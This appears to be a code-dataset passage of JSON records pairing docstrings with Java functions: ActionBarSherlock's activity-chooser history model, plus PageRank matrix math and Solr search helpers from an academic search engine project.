{"docstring": "/**\n * Reads the history data from the backing file if the latter\n * was provided. Calling this method more than once before a call\n * to {@link #persistHistoricalData()} has been made has no effect.\n * <p>\n * <strong>Note:</strong> Historical data is read asynchronously and\n *       as soon as the reading is completed any registered\n *       {@link DataSetObserver}s will be notified. Also no historical\n *       data is read until this method is invoked.\n * <p>\n */\n", "func_signal": "private void readHistoricalData()", "code": "{\n    synchronized (mInstanceLock) {\n        if (!mCanReadHistoricalData || !mHistoricalRecordsChanged) {\n            return;\n        }\n        mCanReadHistoricalData = false;\n        mReadShareHistoryCalled = true;\n        if (!TextUtils.isEmpty(mHistoryFileName)) {\n            /*AsyncTask.*/SERIAL_EXECUTOR.execute(new HistoryLoader());\n        }\n    }\n}", "path": "ActionBarSherlock\\src\\com\\actionbarsherlock\\widget\\ActivityChooserModel.java", "repo_name": "ClockworkMod/DeskSMS", "stars": 103, "license": "None", "language": "java", "size": 6696}
{"docstring": "/**\n * Sets the default activity. The default activity is set by adding a\n * historical record with weight high enough that this activity will\n * become the highest ranked. Such a strategy guarantees that the default\n * will eventually change if not used. Also the weight of the record for\n * setting a default is inflated with a constant amount to guarantee that\n * it will stay as default for awhile.\n *\n * @param index The index of the activity to set as default.\n */\n", "func_signal": "public void setDefaultActivity(int index)", "code": "{\n    ActivityResolveInfo newDefaultActivity = mActivites.get(index);\n    ActivityResolveInfo oldDefaultActivity = mActivites.get(0);\n\n    final float weight;\n    if (oldDefaultActivity != null) {\n        // Add a record with weight enough to boost the chosen at the top.\n        weight = oldDefaultActivity.weight - newDefaultActivity.weight\n            + DEFAULT_ACTIVITY_INFLATION;\n    } else {\n        weight = DEFAULT_HISTORICAL_RECORD_WEIGHT;\n    }\n\n    ComponentName defaultName = new ComponentName(\n            newDefaultActivity.resolveInfo.activityInfo.packageName,\n            newDefaultActivity.resolveInfo.activityInfo.name);\n    HistoricalRecord historicalRecord = new HistoricalRecord(defaultName,\n            System.currentTimeMillis(), weight);\n    addHisoricalRecord(historicalRecord);\n}", "path": "ActionBarSherlock\\src\\com\\actionbarsherlock\\widget\\ActivityChooserModel.java", "repo_name": "ClockworkMod/DeskSMS", "stars": 103, "license": "None", "language": "java", "size": 6696}
{"docstring": "/**\n * Adds a historical record.\n *\n * @param historicalRecord The record to add.\n * @return True if the record was added.\n */\n", "func_signal": "private boolean addHisoricalRecord(HistoricalRecord historicalRecord)", "code": "{\n    synchronized (mInstanceLock) {\n        final boolean added = mHistoricalRecords.add(historicalRecord);\n        if (added) {\n            mHistoricalRecordsChanged = true;\n            pruneExcessiveHistoricalRecordsLocked();\n            persistHistoricalData();\n            sortActivities();\n        }\n        return added;\n    }\n}", "path": "ActionBarSherlock\\src\\com\\actionbarsherlock\\widget\\ActivityChooserModel.java", "repo_name": "ClockworkMod/DeskSMS", "stars": 103, "license": "None", "language": "java", "size": 6696}
{"docstring": "/**\n * Gets the history size.\n *\n * @return The history size.\n */\n", "func_signal": "public int getHistorySize()", "code": "{\n    synchronized (mInstanceLock) {\n        return mHistoricalRecords.size();\n    }\n}", "path": "ActionBarSherlock\\src\\com\\actionbarsherlock\\widget\\ActivityChooserModel.java", "repo_name": "ClockworkMod/DeskSMS", "stars": 103, "license": "None", "language": "java", "size": 6696}
{"docstring": "/**\n * Gets the default activity, The default activity is defined as the one\n * with highest rank i.e. the first one in the list of activities that can\n * handle the intent.\n *\n * @return The default activity, <code>null</code> id not activities.\n *\n * @see #getActivity(int)\n */\n", "func_signal": "public ResolveInfo getDefaultActivity()", "code": "{\n    synchronized (mInstanceLock) {\n        if (!mActivites.isEmpty()) {\n            return mActivites.get(0).resolveInfo;\n        }\n    }\n    return null;\n}", "path": "ActionBarSherlock\\src\\com\\actionbarsherlock\\widget\\ActivityChooserModel.java", "repo_name": "ClockworkMod/DeskSMS", "stars": 103, "license": "None", "language": "java", "size": 6696}
{"docstring": "/**\n * Sets the sorter for ordering activities based on historical data and an intent.\n *\n * @param activitySorter The sorter.\n *\n * @see ActivitySorter\n */\n", "func_signal": "public void setActivitySorter(ActivitySorter activitySorter)", "code": "{\n    synchronized (mInstanceLock) {\n        if (mActivitySorter == activitySorter) {\n            return;\n        }\n        mActivitySorter = activitySorter;\n        sortActivities();\n    }\n}", "path": "ActionBarSherlock\\src\\com\\actionbarsherlock\\widget\\ActivityChooserModel.java", "repo_name": "ClockworkMod/DeskSMS", "stars": 103, "license": "None", "language": "java", "size": 6696}
{"docstring": "/**\n * Gets the intent for which a activity is being chosen.\n *\n * @return The intent.\n */\n", "func_signal": "public Intent getIntent()", "code": "{\n    synchronized (mInstanceLock) {\n        return mIntent;\n    }\n}", "path": "ActionBarSherlock\\src\\com\\actionbarsherlock\\widget\\ActivityChooserModel.java", "repo_name": "ClockworkMod/DeskSMS", "stars": 103, "license": "None", "language": "java", "size": 6696}
{"docstring": "/**\n * Gets an activity at a given index.\n *\n * @return The activity.\n *\n * @see ActivityResolveInfo\n * @see #setIntent(Intent)\n */\n", "func_signal": "public ResolveInfo getActivity(int index)", "code": "{\n    synchronized (mInstanceLock) {\n        return mActivites.get(index).resolveInfo;\n    }\n}", "path": "ActionBarSherlock\\src\\com\\actionbarsherlock\\widget\\ActivityChooserModel.java", "repo_name": "ClockworkMod/DeskSMS", "stars": 103, "license": "None", "language": "java", "size": 6696}
{"docstring": "/**\n * Sets an intent for which to choose a activity.\n * <p>\n * <strong>Note:</strong> Clients must set only semantically similar\n * intents for each data model.\n * <p>\n *\n * @param intent The intent.\n */\n", "func_signal": "public void setIntent(Intent intent)", "code": "{\n    synchronized (mInstanceLock) {\n        if (mIntent == intent) {\n            return;\n        }\n        mIntent = intent;\n        loadActivitiesLocked();\n    }\n}", "path": "ActionBarSherlock\\src\\com\\actionbarsherlock\\widget\\ActivityChooserModel.java", "repo_name": "ClockworkMod/DeskSMS", "stars": 103, "license": "None", "language": "java", "size": 6696}
{"docstring": "/**\n * Chooses a activity to handle the current intent. This will result in\n * adding a historical record for that action and construct intent with\n * its component name set such that it can be immediately started by the\n * client.\n * <p>\n * <strong>Note:</strong> By calling this method the client guarantees\n * that the returned intent will be started. This intent is returned to\n * the client solely to let additional customization before the start.\n * </p>\n *\n * @return An {@link Intent} for launching the activity or null if the\n *         policy has consumed the intent.\n *\n * @see HistoricalRecord\n * @see OnChooseActivityListener\n */\n", "func_signal": "public Intent chooseActivity(int index)", "code": "{\n    ActivityResolveInfo chosenActivity = mActivites.get(index);\n\n    ComponentName chosenName = new ComponentName(\n            chosenActivity.resolveInfo.activityInfo.packageName,\n            chosenActivity.resolveInfo.activityInfo.name);\n\n    Intent choiceIntent = new Intent(mIntent);\n    choiceIntent.setComponent(chosenName);\n\n    if (mActivityChoserModelPolicy != null) {\n        // Do not allow the policy to change the intent.\n        Intent choiceIntentCopy = new Intent(choiceIntent);\n        final boolean handled = mActivityChoserModelPolicy.onChooseActivity(this,\n                choiceIntentCopy);\n        if (handled) {\n            return null;\n        }\n    }\n\n    HistoricalRecord historicalRecord = new HistoricalRecord(chosenName,\n            System.currentTimeMillis(), DEFAULT_HISTORICAL_RECORD_WEIGHT);\n    addHisoricalRecord(historicalRecord);\n\n    return choiceIntent;\n}", "path": "ActionBarSherlock\\src\\com\\actionbarsherlock\\widget\\ActivityChooserModel.java", "repo_name": "ClockworkMod/DeskSMS", "stars": 103, "license": "None", "language": "java", "size": 6696}
{"docstring": "/**\n * Creates a new instance.\n *\n * @param activityName The activity name.\n * @param time The time the activity was chosen.\n * @param weight The weight of the record.\n */\n", "func_signal": "public HistoricalRecord(ComponentName activityName, long time, float weight)", "code": "{\n    this.activity = activityName;\n    this.time = time;\n    this.weight = weight;\n}", "path": "ActionBarSherlock\\src\\com\\actionbarsherlock\\widget\\ActivityChooserModel.java", "repo_name": "ClockworkMod/DeskSMS", "stars": 103, "license": "None", "language": "java", "size": 6696}
{"docstring": "/**\n * Gets the index of a the given activity.\n *\n * @param activity The activity index.\n *\n * @return The index if found, -1 otherwise.\n */\n", "func_signal": "public int getActivityIndex(ResolveInfo activity)", "code": "{\n    List<ActivityResolveInfo> activities = mActivites;\n    final int activityCount = activities.size();\n    for (int i = 0; i < activityCount; i++) {\n        ActivityResolveInfo currentActivity = activities.get(i);\n        if (currentActivity.resolveInfo == activity) {\n            return i;\n        }\n    }\n    return INVALID_INDEX;\n}", "path": "ActionBarSherlock\\src\\com\\actionbarsherlock\\widget\\ActivityChooserModel.java", "repo_name": "ClockworkMod/DeskSMS", "stars": 103, "license": "None", "language": "java", "size": 6696}
{"docstring": "/**\n * Loads the activities.\n */\n", "func_signal": "private void loadActivitiesLocked()", "code": "{\n    mActivites.clear();\n    if (mIntent != null) {\n        List<ResolveInfo> resolveInfos =\n            mContext.getPackageManager().queryIntentActivities(mIntent, 0);\n        final int resolveInfoCount = resolveInfos.size();\n        for (int i = 0; i < resolveInfoCount; i++) {\n            ResolveInfo resolveInfo = resolveInfos.get(i);\n            mActivites.add(new ActivityResolveInfo(resolveInfo));\n        }\n        sortActivities();\n    } else {\n        notifyChanged();\n    }\n}", "path": "ActionBarSherlock\\src\\com\\actionbarsherlock\\widget\\ActivityChooserModel.java", "repo_name": "ClockworkMod/DeskSMS", "stars": 103, "license": "None", "language": "java", "size": 6696}
{"docstring": "/**\n * Gets the number of activities that can handle the intent.\n *\n * @return The activity count.\n *\n * @see #setIntent(Intent)\n */\n", "func_signal": "public int getActivityCount()", "code": "{\n    synchronized (mInstanceLock) {\n        return mActivites.size();\n    }\n}", "path": "ActionBarSherlock\\src\\com\\actionbarsherlock\\widget\\ActivityChooserModel.java", "repo_name": "ClockworkMod/DeskSMS", "stars": 103, "license": "None", "language": "java", "size": 6696}
{"docstring": "/**\n * \u8ba1\u7b97\u4e00\u4e2a\u6570\u4e58\u4ee5\u77e9\u9635\n * \n * @param s\n *            \u77e9\u9635s\n * @param a\n *            double\u7c7b\u578b\u7684\u6570\n * @return \u4e00\u4e2a\u65b0\u7684\u77e9\u9635\n */\n", "func_signal": "public static List<List<Double>> numberMulMatrix(List<List<Double>> s,\n\t\tdouble a)", "code": "{\n\tList<List<Double>> list = new ArrayList<List<Double>>();\n\n\tfor (int i = 0; i < s.size(); i++) {\n\t\tlist.add(new ArrayList<Double>());\n\t\tfor (int j = 0; j < s.get(i).size(); j++) {\n\t\t\tdouble temp = a * s.get(i).get(j).doubleValue();\n\t\t\tlist.get(i).add(new Double(temp));\n\t\t}\n\t}\n\treturn list;\n}", "path": "AcademicSearchEngine\\src\\dcd\\academic\\recommend\\PageRank.java", "repo_name": "pelick/VerticleSearchEngine", "stars": 98, "license": "None", "language": "java", "size": 70815}
{"docstring": "/**\n * \u6253\u5370\u8f93\u51fa\u4e00\u4e2a\u77e9\u9635\n * \n * @param m\n */\n", "func_signal": "public static void printMatrix(List<List<Double>> m)", "code": "{\n\tfor (int i = 0; i < m.size(); i++) {\n\t\tfor (int j = 0; j < m.get(i).size(); j++) {\n\t\t\tSystem.out.print(m.get(i).get(j) + \", \");\n\t\t}\n\t\tSystem.out.println();\n\t}\n}", "path": "AcademicSearchEngine\\src\\dcd\\academic\\recommend\\PageRank.java", "repo_name": "pelick/VerticleSearchEngine", "stars": 98, "license": "None", "language": "java", "size": 70815}
{"docstring": "/**\n * \u8ba1\u7b97\u4e24\u4e2a\u5411\u91cf\u7684\u8ddd\u79bb\n * \n * @param q1\n *            \u7b2c\u4e00\u4e2a\u5411\u91cf\n * @param q2\n *            \u7b2c\u4e8c\u4e2a\u5411\u91cf\n * @return \u5b83\u4eec\u7684\u8ddd\u79bb\n */\n", "func_signal": "public static double calDistance(List<Double> q1, List<Double> q2)", "code": "{\n\tdouble sum = 0;\n\n\tif (q1.size() != q2.size()) {\n\t\treturn -1;\n\t}\n\n\tfor (int i = 0; i < q1.size(); i++) {\n\t\tsum += Math.pow(q1.get(i).doubleValue() - q2.get(i).doubleValue(),\n\t\t\t\t2);\n\t}\n\treturn Math.sqrt(sum);\n}", "path": "AcademicSearchEngine\\src\\dcd\\academic\\recommend\\PageRank.java", "repo_name": "pelick/VerticleSearchEngine", "stars": 98, "license": "None", "language": "java", "size": 70815}
{"docstring": "/**\n * \u83b7\u5f97\u4e00\u4e2a\u521d\u59cb\u7684\u968f\u673a\u5411\u91cfq\n * \n * @param n\n *            \u5411\u91cfq\u7684\u7ef4\u6570\n * @return \u4e00\u4e2a\u968f\u673a\u7684\u5411\u91cfq\uff0c\u6bcf\u4e00\u7ef4\u662f0-5\u4e4b\u95f4\u7684\u968f\u673a\u6570\n */\n", "func_signal": "public static List<Double> getInitQ(int n)", "code": "{\n\tRandom random = new Random();\n\tList<Double> q = new ArrayList<Double>();\n\tfor (int i = 0; i < n; i++) {\n\t\tq.add(new Double(5 * random.nextDouble()));\n\t}\n\treturn q;\n}", "path": "AcademicSearchEngine\\src\\dcd\\academic\\recommend\\PageRank.java", "repo_name": "pelick/VerticleSearchEngine", "stars": 98, "license": "None", "language": "java", "size": 70815}
{"docstring": "// \u7528\u4e8eindex.jsp\u91cc\u7684\u8bba\u6587\u641c\u7d22\n", "func_signal": "public TotalListMap getPaperMetaList(String field, String q, int start, int rows)", "code": "{\n\tTotalListMap map = new TotalListMap();\n\tList<PublicationModel> paperlist = new ArrayList<PublicationModel>();\n\tSolrServer server = client.getSolrServer();\n\tSolrQuery query = new SolrQuery();\n\n\tquery.setQuery(StringUtil.transformQuery(field, q));\n\tquery.setHighlight(true);\n\tquery.addHighlightField(\"title\");\n\tquery.addHighlightField(\"pub_abstract\");\n\tquery.setHighlightSimplePre(\"<strong>\");\n\tquery.setHighlightSimplePost(\"</strong>\");\n\tquery.setStart(start);\n\tquery.setRows(rows);\n\tQueryResponse rsp;\n\ttry {\n\t\trsp = server.query(query);\n\t\tSolrDocumentList docs = rsp.getResults();\n\t\tIterator<SolrDocument> it = docs.iterator();\n\t\twhile (it.hasNext()) {\n\t\t\tSolrDocument resultDoc = it.next();\n\t\t\tPublicationModel pmodel = new PublicationModel();\n\t\t\tpmodel.setTitle((String)resultDoc.getFieldValue(\"title\"));\n\t\t\tString author = (String)resultDoc.getFieldValue(\"author\");\n\t\t\tpmodel.setAuthor(author);\n\t\t\tString[] authors = author.split(\", \");\n\t\t\tArrayList<ResearcherModel> list = new ArrayList<ResearcherModel>();\n\t\t\tfor (int i = 0; i < authors.length; i ++) {\n\t\t\t\tlist.add(getAuthorInfo(authors[i]));\n\t\t\t}\n\n\t\t\tpmodel.setAuthors(list);\n\t\t\tpmodel.setPub_abstract((String)resultDoc.getFieldValue(\"pub_abstract\"));\n\t\t\tpmodel.setConference((String)resultDoc.getFieldValue(\"conference\"));\n\t\t\tString url = (String)resultDoc.getFieldValue(\"view_url\");\n\t\t\tif (url.startsWith(\"http\")) {\n\t\t\t\tpmodel.setView_url(url);\n\t\t\t} else {\n\t\t\t\tpmodel.setView_url(null);\n\t\t\t}\n\t\t\tpaperlist.add(pmodel);\n\t\t}\n\t\tmap.setTotal(rsp.getResults().getNumFound());\n\t\tmap.setList(paperlist);\n\t} catch (SolrServerException e) {\n\t\te.printStackTrace();\n\t}\n\treturn map;\n}", "path": "AcademicSearchEngine\\src\\dcd\\academic\\solrj\\SolrjHelper.java", "repo_name": "pelick/VerticleSearchEngine", "stars": 98, "license": "None", "language": "java", "size": 70815}
{"docstring": "// \u7528\u4e8eindex.jsp\u91cc\u7684\u5b66\u8005\u641c\u7d22\u3002\u4f20\u5165name\u53c2\u6570\uff0c\u4ee5\u53ca\u9644\u52a0\u7684\u7814\u7a76\u9886\u57df\u548c\u5de5\u4f5c\u5730\u53c2\u6570\uff0c\u5f97\u5230\u4e00\u4e2a\u5b66\u8005\u7684\u96c6\u5408\uff0c\u6bcf\u4e2a\u5b66\u8005\u5305\u542b\u4e86\u57fa\u672c\u5143\u6570\u636e\u4fe1\u606f\u3002\n", "func_signal": "public TotalListMap getAuthorMetaList(String field, String q, String field_key, String workplace, int start, int rows)", "code": "{\n\tTotalListMap map = new TotalListMap();\n\tList<ResearcherModel> authorlist = new ArrayList<ResearcherModel>();\n\tSolrServer server = client.getSolrServer();\n\tSolrQuery query = new SolrQuery();\n\t\n\tif (field_key.equals(\"\") && workplace.equals(\"\")) {\n\t\tquery.setQuery(StringUtil.transformQuery(\"name\", q));\n\t} else if (workplace.equals(\"\")) {\n\t\tquery.setQuery(StringUtil.transformQuery(\"name\", q)+\" \"+StringUtil.transformQuery(\"field\", field_key));\n\t} else if (field_key.equals(\"\")) {\n\t\tquery.setQuery(StringUtil.transformQuery(\"name\", q)+\" \"+StringUtil.transformQuery(\"workplace\", workplace));\n\t} else {\n\t\tquery.setQuery(StringUtil.transformQuery(\"name\", q)+\" \"+StringUtil.transformQuery(\"field\", field_key)+\" \"+StringUtil.transformQuery(\"workplace\", workplace));\n\t}\n\tquery.setHighlight(true);\n\tquery.addHighlightField(\"name\");\n\tquery.setHighlightSimplePre(\"<strong>\");\n\tquery.setHighlightSimplePost(\"</strong>\");\n\tquery.setStart(start);\n\tquery.setRows(rows);\n\tQueryResponse rsp;\n\ttry {\n\t\trsp = server.query(query);\n\t\tSolrDocumentList docs = rsp.getResults();\n\t\tIterator<SolrDocument> it = docs.iterator();\n\t\twhile (it.hasNext()) {\n\t\t\tSolrDocument resultDoc = it.next();\n\t\t\tResearcherModel rmodel = new ResearcherModel();\n\t\t\trmodel.setName((String)resultDoc.getFieldValue(\"name\"));\n\t\t\trmodel.setWorkplace((String)resultDoc.getFieldValue(\"workplace\"));\n\t\t\trmodel.setHomepage((String)resultDoc.getFieldValue(\"homepage\"));\n\t\t\trmodel.setField((String)resultDoc.getFieldValue(\"field\"));\n\t\t\trmodel.setPicurl((String)resultDoc.getFieldValue(\"picurl\"));\n\t\t\tauthorlist.add(rmodel);\n\t\t}\n\t\tmap.setTotal(rsp.getResults().getNumFound());\n\t\tmap.setList(authorlist);\n\t} catch (SolrServerException e) {\n\t\te.printStackTrace();\n\t}\n\treturn map;\n}", "path": "AcademicSearchEngine\\src\\dcd\\academic\\solrj\\SolrjHelper.java", "repo_name": "pelick/VerticleSearchEngine", "stars": 98, "license": "None", "language": "java", "size": 70815}
{"docstring": "// \u7528\u4e8eindex.jsp\u91cc\u7684\u5168\u6587\u641c\u7d22\n", "func_signal": "public TotalListMap getPaperFullList(String field, String q, int start, int rows)", "code": "{\n\tTotalListMap map = new TotalListMap();\n\tList<PaperModel> paperfulllist = new ArrayList<PaperModel>();\n\tSolrServer server = client.getSolrServer();\n\tSolrQuery query = new SolrQuery();\n\t\n\tquery.setQuery(StringUtil.transformQuery(field, q));\n\tquery.setStart(start);\n\tquery.setRows(rows);\n\tQueryResponse rsp;\n\ttry {\n\t\trsp = server.query(query);\n\t\tSolrDocumentList docs = rsp.getResults();\n\t\tIterator<SolrDocument> it = docs.iterator();\n\t\twhile (it.hasNext()) {\n\t\t\tSolrDocument resultDoc = it.next();\n\t\t\tPaperModel pmodel = new PaperModel();\n\t\t\tpmodel.setName((String)resultDoc.getFieldValue(\"name\"));\n\t\t\tpmodel.setTitle((String)resultDoc.getFieldValue(\"title\"));\n\t\t\tpmodel.setUrl((String)resultDoc.getFieldValue(\"url\"));\n\t\t\tpaperfulllist.add(pmodel);\n\t\t}\n\t\tmap.setTotal(rsp.getResults().getNumFound());\n\t\tmap.setList(paperfulllist);\n\t} catch (SolrServerException e) {\n\t\te.printStackTrace();\n\t}\n\treturn map;\n}", "path": "AcademicSearchEngine\\src\\dcd\\academic\\solrj\\SolrjHelper.java", "repo_name": "pelick/VerticleSearchEngine", "stars": 98, "license": "None", "language": "java", "size": 70815}
{"docstring": "/**\n * \u8ba1\u7b97\u4e24\u4e2a\u77e9\u9635\u7684\u548c\n * \n * @param list1\n *            \u7b2c\u4e00\u4e2a\u77e9\u9635\n * @param list2\n *            \u7b2c\u4e8c\u4e2a\u77e9\u9635\n * @return \u4e24\u4e2a\u77e9\u9635\u7684\u548c\n */\n", "func_signal": "public static List<List<Double>> addMatrix(List<List<Double>> list1,\n\t\tList<List<Double>> list2)", "code": "{\n\tList<List<Double>> list = new ArrayList<List<Double>>();\n\tif (list1.size() != list2.size() || list1.size() <= 0\n\t\t\t|| list2.size() <= 0) {\n\t\treturn null;\n\t}\n\tfor (int i = 0; i < list1.size(); i++) {\n\t\tlist.add(new ArrayList<Double>());\n\t\tfor (int j = 0; j < list1.get(i).size(); j++) {\n\t\t\tdouble temp = list1.get(i).get(j).doubleValue()\n\t\t\t\t\t+ list2.get(i).get(j).doubleValue();\n\t\t\tlist.get(i).add(new Double(temp));\n\t\t}\n\t}\n\treturn list;\n}", "path": "AcademicSearchEngine\\src\\dcd\\academic\\recommend\\PageRank.java", "repo_name": "pelick/VerticleSearchEngine", "stars": 98, "license": "None", "language": "java", "size": 70815}
{"docstring": "/**\n * \u8ba1\u7b97pagerank\n * \n * @param q1\n *            \u521d\u59cb\u5411\u91cf\n * @param a\n *            alpha\u7684\u503c\n * @return pagerank\u7684\u7ed3\u679c\n */\n", "func_signal": "public static List<Double> calPageRank(List<Double> q1, double a)", "code": "{\n\n\tList<List<Double>> g = getG(a);\n\tList<Double> q = null;\n\twhile (true) {\n\t\tq = vectorMulMatrix(g, q1);\n\t\tdouble dis = calDistance(q, q1);\n\t\tSystem.out.println(dis);\n\t\tif (dis <= DISTANCE) {\n\t\t\tSystem.out.println(\"q1:\");\n\t\t\tprintVec(q1);\n\t\t\tSystem.out.println(\"q:\");\n\t\t\tprintVec(q);\n\t\t\tbreak;\n\t\t}\n\t\tq1 = q;\n\t}\n\treturn q;\n}", "path": "AcademicSearchEngine\\src\\dcd\\academic\\recommend\\PageRank.java", "repo_name": "pelick/VerticleSearchEngine", "stars": 98, "license": "None", "language": "java", "size": 70815}
{"docstring": "/**\n * \u8ba1\u7b97\u4e00\u4e2a\u77e9\u9635\u4e58\u4ee5\u4e00\u4e2a\u5411\u91cf\n * \n * @param m\n *            \u4e00\u4e2a\u77e9\u9635\n * @param v\n *            \u4e00\u4e2a\u5411\u91cf\n * @return \u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u5411\u91cf\n */\n", "func_signal": "public static List<Double> vectorMulMatrix(List<List<Double>> m,\n\t\tList<Double> v)", "code": "{\n\tif (m == null || v == null || m.size() <= 0\n\t\t\t|| m.get(0).size() != v.size()) {\n\t\treturn null;\n\t}\n\n\tList<Double> list = new ArrayList<Double>();\n\tfor (int i = 0; i < m.size(); i++) {\n\t\tdouble sum = 0;\n\t\tfor (int j = 0; j < m.get(i).size(); j++) {\n\t\t\tdouble temp = m.get(i).get(j).doubleValue()\n\t\t\t\t\t* v.get(j).doubleValue();\n\t\t\tsum += temp;\n\t\t}\n\t\tlist.add(sum);\n\t}\n\n\treturn list;\n}", "path": "AcademicSearchEngine\\src\\dcd\\academic\\recommend\\PageRank.java", "repo_name": "pelick/VerticleSearchEngine", "stars": 98, "license": "None", "language": "java", "size": 70815}
{"docstring": "// \u4f20\u5165name\uff0c\u5f97\u5230\u8be5\u5b66\u8005\u76f8\u5173\u7684\u6240\u6709\u8bba\u6587\u96c6\u5408\n", "func_signal": "public List<String> getAuthorPubs(String name, int start, int rows) throws IOException", "code": "{\n\tList<String> array = new ArrayList<String>();\n\tSolrjClient newclient = new SolrjClient(1);\n\tSolrServer server = newclient.getSolrServer();\n\tSolrQuery query = new SolrQuery();\n\tquery.setQuery(StringUtil.transformQuery(\"author\", name));\n\tquery.setStart(start);\n\tquery.setRows(rows);\n\tQueryResponse rsp;\n\ttry {\n\t\trsp = server.query(query);\n\t\tSolrDocumentList docs = rsp.getResults();\n\t\tIterator<SolrDocument> it = docs.iterator();\n\t\twhile (it.hasNext()) {\n\t\t\tSolrDocument resultDoc = it.next();\n\t\t\tString s = \"\";\n\t\t\ts = s + (String)resultDoc.getFieldValue(\"pub_abstract\");\n\t\t\ts = s + \" \" + (String)resultDoc.getFieldValue(\"title\");\n\t\t\tarray.add(s);\n\t\t}\n\n\t} catch (SolrServerException e) {\n\t\te.printStackTrace();\n\t}\n\treturn array;\n}", "path": "AcademicSearchEngine\\src\\dcd\\academic\\solrj\\SolrjHelper.java", "repo_name": "pelick/VerticleSearchEngine", "stars": 98, "license": "None", "language": "java", "size": 70815}
{"docstring": "/**\n * \u6253\u5370\u8f93\u51fa\u4e00\u4e2a\u5411\u91cf\n * \n * @param v\n */\n", "func_signal": "public static void printVec(List<Double> v)", "code": "{\n\tfor (int i = 0; i < v.size(); i++) {\n\t\tSystem.out.print(v.get(i) + \", \");\n\t}\n\tSystem.out.println();\n}", "path": "AcademicSearchEngine\\src\\dcd\\academic\\recommend\\PageRank.java", "repo_name": "pelick/VerticleSearchEngine", "stars": 98, "license": "None", "language": "java", "size": 70815}
{"docstring": "// \u4f20\u5165name\uff0c\u5f97\u5230\u8be5\u5b66\u8005\u7684\u6240\u6709\u8bba\u6587\u7684\u6807\u9898\u548c\u6458\u8981\u96c6\u5408\n", "func_signal": "public List<String> getAuthorAbstraction(String name, int start, int rows) throws IOException", "code": "{\n\tString s = \"\";\n\tSolrjClient newclient = new SolrjClient(1);\n\tSolrServer server = newclient.getSolrServer();\n\tSolrQuery query = new SolrQuery();\n\tquery.setQuery(StringUtil.transformQuery(\"author\", name));\n\tquery.setStart(start);\n\tquery.setRows(rows);\n\tQueryResponse rsp;\n\ttry {\n\t\trsp = server.query(query);\n\t\tSolrDocumentList docs = rsp.getResults();\n\t\tIterator<SolrDocument> it = docs.iterator();\n\t\twhile (it.hasNext()) {\n\t\t\tSolrDocument resultDoc = it.next();\n\t\t\ts = s + \" \" + (String)resultDoc.getFieldValue(\"pub_abstract\");\n\t\t\ts = s + \" \" + (String)resultDoc.getFieldValue(\"title\");\n\t\t}\n\n\t} catch (SolrServerException e) {\n\t\te.printStackTrace();\n\t}\n\tList<String> array = StringUtil.getTokens(s);\n\treturn array;\n}", "path": "AcademicSearchEngine\\src\\dcd\\academic\\solrj\\SolrjHelper.java", "repo_name": "pelick/VerticleSearchEngine", "stars": 98, "license": "None", "language": "java", "size": 70815}
{"docstring": "// \u4f20\u5165title\u5f97\u5230\u8bba\u6587\u5143\u6570\u636e\u4fe1\u606f\n", "func_signal": "public PublicationModel getPaperInfo(String title)", "code": "{\n\tPublicationModel paper = null;\n\tSolrServer server = client.getSolrServer();\n\tSolrQuery query = new SolrQuery();\n\tquery.setQuery(StringUtil.transformQuery(\"title\", title));\n\tquery.setStart(0);\n\tquery.setRows(1);\n\tQueryResponse rsp;\n\ttry {\n\t\trsp = server.query(query);\n\t\tSolrDocumentList docs = rsp.getResults();\n\t\tIterator<SolrDocument> it = docs.iterator();\n\t\twhile (it.hasNext()) {\n\t\t\tSolrDocument resultDoc = it.next();\n\t\t\tpaper = new PublicationModel();\n\t\t\tpaper.setTitle((String)resultDoc.getFieldValue(\"title\"));\n\t\t\tpaper.setAuthor((String)resultDoc.getFieldValue(\"author\"));\n\t\t\tpaper.setConference((String)resultDoc.getFieldValue(\"conference\"));\n\t\t\tpaper.setPub_abstract((String)resultDoc.getFieldValue(\"pub_abstract\"));\n\t\t\tbreak;\n\t\t}\n\n\t} catch (SolrServerException e) {\n\t\te.printStackTrace();\n\t}\n\treturn paper;\n}", "path": "AcademicSearchEngine\\src\\dcd\\academic\\solrj\\SolrjHelper.java", "repo_name": "pelick/VerticleSearchEngine", "stars": 98, "license": "None", "language": "java", "size": 70815}
{"docstring": "// \u7528\u4e8e\u5224\u65ad\u662f\u5426\u5b58\u5728\u8be5\u5b66\u8005\u7684\u4fe1\u606f\n", "func_signal": "public boolean existAuthor(String name) throws IOException", "code": "{\n\tboolean is = false;\n\tSolrjClient newclient = new SolrjClient(0);\n\tSolrServer server = newclient.getSolrServer();\n\tSolrQuery query = new SolrQuery();\n\tquery.setQuery(StringUtil.transformQuery(\"name\", name));\n\tQueryResponse rsp;\n\ttry {\n\t\trsp = server.query(query);\n\t\tif (rsp.getResults().getNumFound() > 0) {\n\t\t\tis = true;\n\t\t}\n\t} catch (SolrServerException e) {\n\t\te.printStackTrace();\n\t}\n\treturn is;\n}", "path": "AcademicSearchEngine\\src\\dcd\\academic\\solrj\\SolrjHelper.java", "repo_name": "pelick/VerticleSearchEngine", "stars": 98, "license": "None", "language": "java", "size": 70815}
{"docstring": "// \u4f20\u5165name\uff0c\u5f97\u5230\u5b66\u8005\u5143\u6570\u636e\u4fe1\u606f\n", "func_signal": "public ResearcherModel getAuthorInfo(String name)", "code": "{\n\tResearcherModel author = null;\n\tSolrjClient newclient = new SolrjClient(0);\n\tSolrServer server = newclient.getSolrServer();\n\tSolrQuery query = new SolrQuery();\n\t\n\tquery.setQuery(StringUtil.transformQuery(\"name\", name));\n\tquery.setStart(0);\n\tquery.setRows(1);\n\tQueryResponse rsp;\n\ttry {\n\t\trsp = server.query(query);\n\t\tSolrDocumentList docs = rsp.getResults();\n\t\tIterator<SolrDocument> it = docs.iterator();\n\t\twhile (it.hasNext()) {\n\t\t\tSolrDocument resultDoc = it.next();\n\t\t\tauthor = new ResearcherModel();\n\t\t\tauthor.setName((String)resultDoc.getFieldValue(\"name\"));\n\t\t\tauthor.setWorkplace((String)resultDoc.getFieldValue(\"workplace\"));\n\t\t\tauthor.setHomepage((String)resultDoc.getFieldValue(\"homepage\"));\n\t\t\tauthor.setField((String)resultDoc.getFieldValue(\"field\"));\n\t\t\tauthor.setPicurl((String)resultDoc.getFieldValue(\"picurl\"));\n\t\t\tauthor.setMoretags((String)resultDoc.getFieldValue(\"moretags\"));\n\t\t\tbreak;\n\t\t}\n\n\t} catch (SolrServerException e) {\n\t\te.printStackTrace();\n\t}\n\treturn author;\n}", "path": "AcademicSearchEngine\\src\\dcd\\academic\\solrj\\SolrjHelper.java", "repo_name": "pelick/VerticleSearchEngine", "stars": 98, "license": 